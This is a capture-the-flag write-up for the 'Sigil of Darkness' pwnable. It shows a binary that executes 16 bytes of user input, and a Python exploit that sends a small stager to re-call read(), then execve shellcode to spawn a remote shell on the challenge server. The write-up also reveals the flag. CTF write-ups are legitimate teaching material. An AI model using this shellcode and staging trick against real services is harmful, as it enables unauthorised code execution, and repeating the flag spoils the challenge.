#Sigil of Darkness
**Category:** binary, exploitation, pwnable
**Point:** 200
**Description:**

> simplicity is beauty
> Service: 10.0.66.72:6611 Binary: 172.16.18.20/sigil_of_darkness-f797aea901a1e5c71ea15304e72b892d 

##Write-up

Binary file is given.

First, I decomplied the binary file. And It was a so simple binary.

```c
__int64 main()
{
  void *buffer;

  buffer = mmap(0LL, 0xFFuLL, 7, 34, -1, 0LL);
  memset(buffer, 0, 0xFFuLL);
  read(0, buffer, 0x10uLL);
  ((void (__fastcall *)(_QWORD, void *))buffer)(0LL, buffer);
  return 0LL;
}
```

It was just make memory map, read 0x10byte from user, and execute code it.

0x10byte is too small to send a 64bit shellcode.

And I checked security of binary. No NX, ASLR is on(maybe?). If ASLR is on, we can't use RTL easily.

```
0x400606:	call   0x400490 <memset@plt>
0x40060b:	mov    rax,QWORD PTR [rbp-0x8]
0x40060f:	mov    edx,0x10
0x400614:	mov    rsi,rax
0x400617:	mov    edi,0x0
0x40061c:	call   0x4004a0 <read@plt>  // to this address
0x400621:	mov    rdx,QWORD PTR [rbp-0x8]
0x400625:	mov    eax,0x0
0x40062a:	call   rdx
0x40062c:	mov    eax,0x0
0x400631:	leave
0x400632:	ret
```

So I sent 'mov edx, 0x50; mov eax, 0x40061c; call rax' asm code to make the program execute 'read function' of main. And I send the shellcode to obtain the shell.

rdx is must to not be a too big value. (I have wasted too much time at this point) :(

```python
# Attack.py

import struct
import telnetlib
from socket import *

p8 = lambda x : struct.pack("<L", x)
p16 = lambda x : struct.pack("<Q", x)

def ReadUntil(s, chkStr, isPrint = True) :
    chkLen = len(chkStr)
    data = s.recv(1)
    while True :
        while data[-1] != chkStr[0] :
            data += s.recv(1)
        tem = s.recv(chkLen - 1)
        data += tem
        # tem possible part of chkStr
        # need to fix
        if tem == chkStr[1:] :
            break
        
    if isPrint :
        print data

HOST = "10.0.66.72"
PORT = 6611

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

#exploit!

# mov edx, 0x50
# mov eax, 0x40061c
# call rax
payload = "\xBA\x50\x00\x00\x00\xB8\x1C\x06\x40\x00\xFF\xD0"

shellcode = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"

s.send(payload + "\n")
s.send(shellcode + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
```

The flag is `So_that_might_have_given10s_moreFFRT`